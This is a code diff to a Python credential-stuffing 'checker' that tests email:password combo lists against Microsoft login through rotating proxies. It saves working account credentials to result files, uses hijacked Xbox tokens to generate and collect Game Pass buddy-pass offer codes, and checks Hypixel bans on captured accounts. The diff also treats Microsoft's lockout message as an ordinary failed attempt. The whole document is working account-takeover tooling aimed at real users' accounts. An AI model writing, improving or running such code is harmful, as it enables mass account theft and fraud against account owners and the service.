@@ -1123,6 +1123,8 @@ class Capture:
     def builder(self, mask_password=False, include_timestamp=False):
         if self.banned is None:
             ban_status = '[Unknown]'
+        elif str(self.banned).startswith('[Error]'):
+            ban_status = '[Unknown]'
         elif self.banned and self.banned != 'False':
             ban_status = '[Banned]'
         else:
@@ -1541,20 +1543,35 @@ class Capture:
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
             tries = 0
             while tries < maxretries:
-                connection = Connection('alpha.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
-                
+                connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
+
                 original_handle_exception = connection._handle_exception
                 def safe_handle_exception(e, exc_info):
                     try:
                         error_str = str(e)
-                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and e.winerror == 10053):
+                        if 'RateLimiter disallowed' in error_str or '429' in error_str:
+                            try:
+                                self.banned = '[Error] Rate Limit'
+                            except:
+                                pass
+                            return
+                        if 'SSLError' in error_str or 'EOF occurred' in error_str:
+                             try:
+                                 self.banned = '[Error] Connection/SSL'
+                             except:
+                                 pass
+                             return
+                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and hasattr(e, 'errno') and e.errno == 104):
                             return
                         if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
                             return
                         if isinstance(e, ValueError) and "closed file" in error_str:
                             return
-                        if 'InsufficientPrivilegesException' in error_str or '403' in error_str:
-                            self.banned = "[Error] Multiplayer Disabled / 403"
+                        if isinstance(e, requests.exceptions.RequestException):
+                            try:
+                                 self.banned = '[Error] Connection'
+                            except:
+                                 pass
                             return
                     except:
                         pass
@@ -1674,7 +1691,7 @@ class Capture:
                             connection.connect()
                         
                         c = 0
-                        while self.banned == None and c < 1000:
+                        while self.banned == None and c < 3000:
                             time.sleep(0.01)
                             c += 1
                         connection.disconnect()
@@ -1683,29 +1700,20 @@ class Capture:
 
                     if self.banned is None:
                         self.banned = '[Error] Connection Timeout/No Packet'
-                    
 
-                    if self.banned:
-                        if str(self.banned).startswith('[Error]'):
-                            if tries < maxretries - 1:
-                                self.banned = None
-                                time.sleep(1)
-                                tries += 1
-                                continue
-                            else:
-                                if UI_ENABLED and ui:
-                                    ui.log_info(f'Error checking ban for {self.name}: {self.banned}')
-                                self.banned = None
-                                break
+                    if self.banned and str(self.banned).startswith('[Error]'):
+                        if tries < maxretries - 1:
+                            self.banned = None
+                            time.sleep(1)
+                            tries += 1
+                            continue
+
+                    if self.banned != None:
                         break
-                    
                     tries += 1
                     sys.stderr = original_stderr
                 except Exception:
                     pass
-                if self.banned != None:
-                    break
-                tries += 1
         except Exception:
             errors += 1
     def setname(self):
@@ -2124,13 +2132,8 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
                 with open(f'results/{fname}/2fa.txt', 'a') as file:
                     file.write(f'{email}:{password}\n')
                 return ('2FA', session)
-            elif any((value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', 'help us protect your account'])):
-                if 'password is incorrect' in login_request.text.lower() or "doesn't exist" in login_request.text.lower():
-                    return ('None', session)
-                else:
-                    session.proxies = getproxy()
-                    retries += 1
-                    tries += 1
+            elif any((value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', "tried to sign in too many times with an incorrect account or password", 'help us protect your account'])):
+                return ('None', session)
             else:
                 session.proxies = getproxy()
                 retries += 1
@@ -2395,6 +2398,107 @@ def checkownership(entitlements_response):
         return 'Xbox Game Pass Ultimate'
     elif has_game_pass_pc:
         return 'Xbox Game Pass (PC)'
+def claim_buddypass_offers(session, xbox_token, fname):
+    global retries
+    codes = []
+    try:
+        xsts = None
+        for _ in range(maxretries):
+            try:
+                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'http://mp.microsoft.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
+                break
+            except Exception:
+                retries += 1
+                session.proxies = getproxy()
+                if len(proxylist) == 0:
+                    time.sleep(20)
+                continue
+        else:
+            return
+
+        js = xsts.json()
+        if 'DisplayClaims' not in js or 'xui' not in js['DisplayClaims']: return
+        uhss = js['DisplayClaims']['xui'][0]['uhs']
+        xsts_token = js.get('Token')
+        headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Authorization': f'XBL3.0 x={uhss};{xsts_token}', 'Ms-Cv': 'OgMi8P4bcc7vra2wAjJZ/O.19', 'Origin': 'https://www.xbox.com', 'Priority': 'u=1, i', 'Referer': 'https://www.xbox.com/', 'Sec-Ch-Ua': '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0', 'X-Ms-Api-Version': '1.0'}
+        
+        r = None
+        for _ in range(maxretries):
+            try:
+                r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers, timeout=int(config.get('timeout', 10)))
+                break
+            except Exception:
+                retries += 1
+                session.proxies = getproxy()
+                if len(proxylist) == 0:
+                    time.sleep(20)
+                continue
+        else:
+            return
+
+        if 'offerid' in r.text.lower():
+            offers = r.json()['offers']
+            current_time = datetime.now(timezone.utc)
+            for offer in offers:
+                codes.append(offer['offerId'])
+            
+            if len(offers) < 5:
+                for _ in range(3):
+                    try:
+                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
+                        if 'offerId' in r.text:
+                            offers = r.json()['offers']
+                            current_time = datetime.now(timezone.utc)
+                            valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
+                            
+                            for offer in valid_offer_ids:
+                                write_dedupe(fname, 'Codes.txt', f'{offer}\n')
+                                
+                            shouldContinue = False
+                            for offer in offers:
+                                if offer['offerId'] not in codes:
+                                    shouldContinue = True
+                            for offer in offers:
+                                codes.append(offer['offerId'])
+                            if not shouldContinue:
+                                break
+                        else:
+                            break
+                    except Exception:
+                        retries += 1
+                        session.proxies = getproxy()
+                        if len(proxylist) == 0:
+                            time.sleep(20)
+                        continue
+        else:
+             for _ in range(3):
+                try:
+                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
+                    if 'offerId' in r.text:
+                        offers = r.json()['offers']
+                        current_time = datetime.now(timezone.utc)
+                        valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
+                        for offer in valid_offer_ids:
+                            write_dedupe(fname, 'Codes.txt', f'{offer}\n')
+                        shouldContinue = False
+                        for offer in offers:
+                            if offer['offerId'] not in codes:
+                                shouldContinue = True
+                        for offer in offers:
+                            codes.append(offer['offerId'])
+                        if not shouldContinue:
+                            break
+                    else:
+                        break
+                except Exception:
+                    retries += 1
+                    session.proxies = getproxy()
+                    if len(proxylist) == 0:
+                        time.sleep(20)
+                    continue
+    except Exception:
+        pass
+
 def checkmc(session, email, password, token, xbox_token):
     global retries, bedrock, cpm, checked, xgp, xgpu, other, config
     acctype = None
@@ -2451,208 +2555,26 @@ def checkmc(session, email, password, token, xbox_token):
         if acctype == 'Xbox Game Pass Ultimate' or acctype == 'Normal Minecraft (with Game Pass Ultimate)':
             with stats_lock:
                 xgpu += 1
-            codes = []
             write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
-            try:
-                for _ in range(maxretries):
-                    try:
-                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'http://mp.microsoft.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
-                        break
-                    except Exception:
-                        retries += 1
-                        session.proxies = getproxy()
-                        if len(proxylist) == 0:
-                            time.sleep(20)
-                        continue
-                else:
-                    return False
-                js = xsts.json()
-                uhss = js['DisplayClaims']['xui'][0]['uhs']
-                xsts_token = js.get('Token')
-                headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Authorization': f'XBL3.0 x={uhss};{xsts_token}', 'Ms-Cv': 'OgMi8P4bcc7vra2wAjJZ/O.19', 'Origin': 'https://www.xbox.com', 'Priority': 'u=1, i', 'Referer': 'https://www.xbox.com/', 'Sec-Ch-Ua': '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0', 'X-Ms-Api-Version': '1.0'}
-                for _ in range(maxretries):
-                    try:
-                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers, timeout=int(config.get('timeout', 10)))
-                        break
-                    except Exception:
-                        retries += 1
-                        session.proxies = getproxy()
-                        if len(proxylist) == 0:
-                            time.sleep(20)
-                        continue
-                else:
-                    return False
-                if 'offerid' in r.text.lower():
-                    offers = r.json()['offers']
-                    current_time = datetime.now(timezone.utc)
-                    valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                    for offer in offers:
-                        codes.append(offer['offerId'])
-                    if len(offers) < 5:
-                        for _ in range(maxretries):
-                            try:
-                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
-                                if 'offerId' in r.text:
-                                    offers = r.json()['offers']
-                                    current_time = datetime.now(timezone.utc)
-                                    valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                    for offer in valid_offer_ids:
-                                        write_dedupe(fname, 'Codes.txt', f'{offer}\n')
-                                    shouldContinue = False
-                                    for offer in offers:
-                                        if offer['offerId'] not in codes:
-                                            shouldContinue = True
-                                    for offer in offers:
-                                        codes.append(offer['offerId'])
-                                    if shouldContinue == False:
-                                        break
-                                else:
-                                    break
-                            except Exception:
-                                retries += 1
-                                session.proxies = getproxy()
-                                if len(proxylist) == 0:
-                                    time.sleep(20)
-                                continue
-                else:
-                    for _ in range(maxretries):
-                        try:
-                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
-                            if 'offerId' in r.text:
-                                offers = r.json()['offers']
-                                current_time = datetime.now(timezone.utc)
-                                valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                for offer in valid_offer_ids:
-                                    write_dedupe(fname, 'Codes.txt', f'{offer}\n')
-                                shouldContinue = False
-                                for offer in offers:
-                                    if offer['offerId'] not in codes:
-                                        shouldContinue = True
-                                for offer in offers:
-                                    codes.append(offer['offerId'])
-                                if shouldContinue == False:
-                                    break
-                            else:
-                                break
-                        except Exception:
-                            retries += 1
-                            session.proxies = getproxy()
-                            if len(proxylist) == 0:
-                                time.sleep(20)
-                            continue
-            except:
-                pass
+            claim_buddypass_offers(session, xbox_token, fname)
             capture_mc(token, session, email, password, acctype)
             return True
         elif acctype == 'Xbox Game Pass (PC)' or acctype == 'Normal Minecraft (with Game Pass)':
             with stats_lock:
                 xgp += 1
-            codes = []
-            with stats_lock:
-                xgp += 1
-            codes = []
             write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
             if 'Normal' in acctype:
                 write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
-            try:
-                xsts_attempts = 0
-                while xsts_attempts < maxretries:
-                    try:
-                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'http://mp.microsoft.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
-                        break
-                    except:
-                        retries += 1
-                        session.proxies = getproxy()
-                        xsts_attempts += 1
-                        time.sleep(2 if len(proxylist) > 0 else 3)
-                        continue
-                js = xsts.json()
-                uhss = js['DisplayClaims']['xui'][0]['uhs']
-                xsts_token = js.get('Token')
-                headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Authorization': f'XBL3.0 x={uhss};{xsts_token}', 'Ms-Cv': 'OgMi8P4bcc7vra2wAjJZ/O.19', 'Origin': 'https://www.xbox.com', 'Priority': 'u=1, i', 'Referer': 'https://www.xbox.com/', 'Sec-Ch-Ua': '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0', 'X-Ms-Api-Version': '1.0'}
-                offers_attempts = 0
-                while offers_attempts < maxretries:
-                    try:
-                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
-                        break
-                    except:
-                        retries += 1
-                        session.proxies = getproxy()
-                        offers_attempts += 1
-                        time.sleep(2 if len(proxylist) > 0 else 3)
-                        continue
-                if 'offerid' in r.text.lower():
-                    offers = r.json()['offers']
-                    current_time = datetime.now(timezone.utc)
-                    valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                    for offer in offers:
-                        codes.append(offer['offerId'])
-                    if len(offers) < 5:
-                        gen_attempts = 0
-                        while gen_attempts < 3:
-                            try:
-                                r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
-                                if 'offerId' in r.text:
-                                    offers = r.json()['offers']
-                                    current_time = datetime.now(timezone.utc)
-                                    valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                    for offer in valid_offer_ids:
-                                        write_dedupe(fname, 'Codes.txt', f'{offer}\n')
-                                    shouldContinue = False
-                                    for offer in offers:
-                                        if offer['offerId'] not in codes:
-                                            shouldContinue = True
-                                    for offer in offers:
-                                        codes.append(offer['offerId'])
-                                    if shouldContinue == False:
-                                        break
-                                else:
-                                    break
-                            except:
-                                retries += 1
-                                session.proxies = getproxy()
-                                gen_attempts += 1
-                                time.sleep(2 if len(proxylist) > 0 else 3)
-                                continue
-                else:
-                    gen_attempts = 0
-                    while gen_attempts < 3:
-                        try:
-                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
-                            if 'offerId' in r.text:
-                                offers = r.json()['offers']
-                                current_time = datetime.now(timezone.utc)
-                                valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                with file_lock:
-                                    with open(f'results/{fname}/Codes.txt', 'a') as f:
-                                        for offer in valid_offer_ids:
-                                            f.write(f'{offer}\n')
-                                shouldContinue = False
-                                for offer in offers:
-                                    if offer['offerId'] not in codes:
-                                        shouldContinue = True
-                                for offer in offers:
-                                    codes.append(offer['offerId'])
-                                if shouldContinue == False:
-                                    break
-                            else:
-                                break
-                        except:
-                            retries += 1
-                            session.proxies = getproxy()
-                            gen_attempts += 1
-                            time.sleep(2 if len(proxylist) > 0 else 3)
-                            continue
-            except:
-                pass
+            claim_buddypass_offers(session, xbox_token, fname)
             try:
                 capture_mc(token, session, email, password, acctype)
             except:
                 pass
             return True
         elif acctype == 'Normal Minecraft':
-            with open(f'results/{fname}/Normal.txt', 'a') as f:
-                f.write(f'{email}:{password}\n')
+            with file_lock:
+                with open(f'results/{fname}/Normal.txt', 'a') as f:
+                    f.write(f'{email}:{password}\n')
             try:
                 capture_mc(token, session, email, password, acctype)
             except:
@@ -3031,56 +2953,7 @@ def logscreen():
             ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm1 * 60, retries=retries, errors=errors)
             ui.show_ui_screen()
         time.sleep(1)
-def load_proxies():
-    global proxylist, banproxies
-    proxy_pattern = re.compile('^\\d+\\.\\d+\\.\\d+\\.\\d+:\\d+')
-    if os.path.exists('proxies.txt'):
-        try:
-            with open('proxies.txt', 'r', encoding='utf-8') as f:
-                lines = f.readlines()
-                proxylist = []
-                seen = set()
-                for line in lines:
-                    line = line.strip()
-                    if line and (not line.startswith('#')) and (line not in seen):
-                        if ':' in line and len(line) < 100:
-                            seen.add(line)
-                            proxylist.append(line)
-            proxy_count = len(proxylist)
-            print(f'{Fore.GREEN}[{proxy_count}] Proxies loaded.{Fore.RESET}')
-            print(f'{Fore.CYAN}[INFO] Supports all formats: HTTP/S, SOCKS4, SOCKS5, with/without authentication{Fore.RESET}')
-            if UI_ENABLED and ui:
-                protocol_name = 'HTTP/S'
-                if proxytype == "'2'":
-                    protocol_name = 'SOCKS4'
-                elif proxytype == "'3'":
-                    protocol_name = 'SOCKS5'
-                ui.log_info(f'{proxy_count} {protocol_name} proxies loaded (duplicates removed)')
-        except (IOError, OSError, MemoryError) as e:
-            print(f'{Fore.YELLOW}Warning: Could not load proxies.txt - {e}{Fore.RESET}')
-    else:
-        print(f'{Fore.YELLOW}No proxies.txt found. Running without proxies.{Fore.RESET}')
-    if os.path.exists('banproxies.txt'):
-        try:
-            with open('banproxies.txt', 'r', encoding='utf-8') as f:
-                lines = f.readlines()
-                banproxies = []
-                seen = set()
-                for line in lines:
-                    line = line.strip()
-                    if line and (not line.startswith('#')) and (line not in seen):
-                        if ':' in line and len(line) < 100:
-                            seen.add(line)
-                            banproxies.append(line)
-            ban_count = len(banproxies)
-            print(f'{Fore.GREEN}[{ban_count}] Ban check proxies loaded.{Fore.RESET}')
-            print(f'{Fore.CYAN}[INFO] Supports all formats: HTTP/S, SOCKS4, SOCKS5, with/without authentication{Fore.RESET}')
-            if UI_ENABLED and ui:
-                ui.log_info(f'{ban_count} SOCKS5 proxies loaded for ban checking (duplicates removed)')
-        except (IOError, OSError, MemoryError) as e:
-            print(f'{Fore.YELLOW}Warning: Could not load banproxies.txt - {e}{Fore.RESET}')
-    else:
-        print(f'{Fore.YELLOW}No banproxies.txt found. Ban checking may not work properly.{Fore.RESET}')
+
 def load_proxy_file():
     global proxylist
     filename = None
@@ -3153,17 +3026,17 @@ def Load():
             if UI_ENABLED and ui:
                 ui.log_info(f'Loaded {len(Combos)} combos ({dupes_removed} duplicates removed)')
             print(f'\n{Fore.CYAN}✓ File loaded successfully!{Fore.RESET}')
-            time.sleep(1)
+            time.sleep(3)
     except (IOError, OSError, MemoryError) as e:
         print(f'\n✗ Error reading combo file: {str(e)}')
         print('Please check the file and try again.')
         time.sleep(2)
-        Load()
+        return
     except Exception as e:
         print(f'\n✗ Error reading file: {str(e)}')
         print(f'✗ Your file is probably corrupted or in wrong format.')
         time.sleep(2)
-        Load()
+        return
 def loadconfig():
     global maxretries, config
     def str_to_bool(value):
